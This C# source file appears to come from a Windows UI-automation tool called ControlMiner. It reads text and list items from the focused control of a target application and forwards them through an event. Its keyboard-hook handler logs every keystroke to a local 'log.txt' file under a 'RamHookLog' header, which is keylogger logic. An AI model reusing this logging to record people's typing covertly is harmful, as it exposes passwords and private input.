﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ControlMiner
{
    public class Wrapper
    {
        const int WM_GETTEXT = 0x000D;
        const int WM_GETTEXTLENGTH = 0x000E;
        const int LB_SETCURSEL = 0x0186;
        const int LB_GETCURSEL = 0x0188;
        const int LB_GETCOUNT = 0x018B;
        const int LB_GETTEXT = 0x0189;

        NativeMethods.GUITHREADINFO guiInfo;                     // To store GUI Thread Information
        Point caretPosition;                     // To store Caret Position  
        ControlMiner.NativeMethods.Rect NotepadRect;
        string appName = string.Empty;
        static IntPtr appHandles = IntPtr.Zero;
        static string Id = string.Empty;
        

        public delegate void CaptureHandler(string position, string message);

        // Define an Event based on the above Delegate
        public event CaptureHandler SendMessageToWeb;


        public Wrapper() { }

        public Wrapper(string applicationName, IntPtr handles)
        {
            appName = applicationName;
            appHandles = handles;
        }

        public static string GetControlText()
        {
            IntPtr hWnd = FocusedControlInActiveWindow(appHandles);
            StringBuilder title = new StringBuilder();

            // Get the size of the string required to hold the window title. 
            Int32 size = NativeMethods.SendMessage((int)hWnd, WM_GETTEXTLENGTH, 0, 0).ToInt32();

            // If the return is 0, there is no title. 
            if (size > 0)
            {
                title = new StringBuilder(size + 1);
                NativeMethods.SendMessage(hWnd, (int)WM_GETTEXT, title.Capacity, title);
            }
            return title.ToString();
        }

        public static List<string> GetListBoxContents(out string selectedText)
        {
            IntPtr hWnd = FocusedControlInActiveWindow(appHandles);
            int cnt = (int)NativeMethods.SendMessage(hWnd, LB_GETCOUNT, IntPtr.Zero, null);
            int selectedindex = (int)NativeMethods.SendMessage(hWnd, (uint)LB_GETCURSEL, IntPtr.Zero, null);
            List<string> listBoxContent = new List<string>();
            if (cnt > 0)
            {

                for (int i = 0; i < cnt; i++)
                {
                    StringBuilder sb = new StringBuilder(256);
                    IntPtr getText = NativeMethods.SendMessage(hWnd, LB_GETTEXT, (IntPtr)i, sb);
                    listBoxContent.Add(sb.ToString());
                }
            }
            selectedText = (selectedindex != -1 && listBoxContent.Count != 0) ? listBoxContent[selectedindex].ToString() : "";
            return listBoxContent;
        }


        private static IntPtr FocusedControlInActiveWindow(IntPtr handle)
        {
            IntPtr activeWindowHandle = NativeMethods.GetForegroundWindow();

            IntPtr activeWindowThread = NativeMethods.GetWindowThreadProcessId(activeWindowHandle, IntPtr.Zero);
            IntPtr thisWindowThread = NativeMethods.GetWindowThreadProcessId(handle, IntPtr.Zero);

            NativeMethods.AttachThreadInput(activeWindowThread, thisWindowThread, true);
            IntPtr focusedControlHandle = NativeMethods.GetFocus();
            Id = NativeMethods.GetDlgCtrlID(focusedControlHandle).ToString();
            NativeMethods.AttachThreadInput(activeWindowThread, thisWindowThread, false);

            return focusedControlHandle;
        }

        /// <summary>
        /// Get the caret position
        /// </summary>
        public void GetCaretPosition()
        {
            guiInfo = new NativeMethods.GUITHREADINFO();
            guiInfo.cbSize = (uint)Marshal.SizeOf(guiInfo);

            // Get GuiThreadInfo into guiInfo
            NativeMethods.GetGUIThreadInfo(0, out guiInfo);
        }

        public void EvaluateCaretPosition()
        {
            caretPosition = new Point();

            // Fetch GUITHREADINFO
            GetCaretPosition();

            caretPosition.X = (int)guiInfo.rcCaret.Left + 25;
            caretPosition.Y = (int)guiInfo.rcCaret.Bottom + 25;

            NativeMethods.ClientToScreen(guiInfo.hwndCaret, out caretPosition);
        }

        public NativeMethods.Rect GetPosition()
        {
            EvaluateCaretPosition();
            IntPtr hWnd = NativeMethods.FindWindow(null, appName); //Calculator is Windows calc title text
            NotepadRect = new NativeMethods.Rect();
            NativeMethods.GetWindowRect(hWnd, ref NotepadRect);
            NotepadRect.Width = NotepadRect.Right - NotepadRect.Left + 1;
            NotepadRect.Height = NotepadRect.Bottom - NotepadRect.Top + 1;
            NotepadRect.Position = (((caretPosition.X > NotepadRect.Left) ? (caretPosition.X - NotepadRect.Left) : (NotepadRect.Left - caretPosition.X)) + ((caretPosition.Y > NotepadRect.Top) ? (caretPosition.Y - NotepadRect.Top) : (NotepadRect.Top - caretPosition.Y))).ToString(); ;
            return NotepadRect;
        }

        public bool IsApplicationActive()
        {
            bool applicationFound = false;
            IntPtr handle = IntPtr.Zero;
            handle = NativeMethods.GetForegroundWindow();
            StringBuilder Buff = new StringBuilder(256);

            if (NativeMethods.GetWindowText(handle, Buff, 256) > 0 && Buff.ToString().Equals(appName))
            {
                applicationFound = true;
            }
            return applicationFound;
        }

        /// <summary>
        /// current pressed keys cache
        /// stores keys and empties itself after flushing
        /// </summary>
        private string cache = "";

        /// <summary>
        /// Gets string representation of provided key code
        /// </summary>
        /// <param name="vk">virtual key code</param>
        /// <returns>readable key code text</returns>
        public string GetKeyString(VKeys vk)
        {
            string name = Enum.GetName(typeof(VKeys), vk);
            if (!string.IsNullOrEmpty(name))
            {
                // represent a-z & 0-9 keys
                if (name.Contains("KEY_"))
                {
                    return name.Remove(0, 4);
                }
            }

            // display SPACE key as ' '
            if (vk == VKeys.SPACE)
            {
                return " ";
            }

            // enter should be represented as a new line
            if (vk == VKeys.RETURN)
            {
                return "\r\n";
            }

            if (vk == VKeys.TAB)
            {
                //var rect = GetPosition();
                if (IsApplicationActive())
                {
                    string textboxValue = GetControlText();

                    string selectedItem = string.Empty;
                    GetListBoxContents(out selectedItem);

                    SendMessageToWeb(Id, (string.IsNullOrEmpty(textboxValue) ? selectedItem : textboxValue));
                }
                
                return "NEXT";
            }

            return "[" + name + "]";
        }

        /// <summary>
        /// Processes the keyboard events
        /// </summary>
        public void ProcessHook(IntPtr wParam, IntPtr lParam)
        {
            int key = Marshal.ReadInt32(lParam);

            // add to cache
            cache += GetKeyString((VKeys)key);

            // cache full? let's flush
            if (cache.Length >= 256)
            {
                ActionFlush();
            }
        }

        /// <summary>
        /// Flush the cache to log file
        /// </summary>
        public void ActionFlush()
        {
            //if (Properties.Settings.Default.uppercase == false)
            //{
            //    cache = cache.ToLower();
            //}

            try
            {
                File.AppendAllText("log.txt", cache);
                cache = "";
            }
            catch (Exception)
            {
            }
        }

        /// <summary>
        /// Session started. Write the header to the log file
        /// </summary>
        public void PrepareFile()
        {
            try
            {

                File.AppendAllText("log.txt", "\r\n\r\n\r\n==============================================");
                File.AppendAllText("log.txt", "\r\nRamHookLog - " + DateTime.Now.ToString());
                File.AppendAllText("log.txt", "\r\n==============================================\r\n");
            }
            catch (Exception)
            {
            }
        }

        /// <summary>
        /// Clear log file
        /// </summary>
        public void ClearLogFile()
        {
            try
            {
                File.WriteAllText("log.txt", "");
            }
            catch (Exception)
            {
            }
        }
    }
}
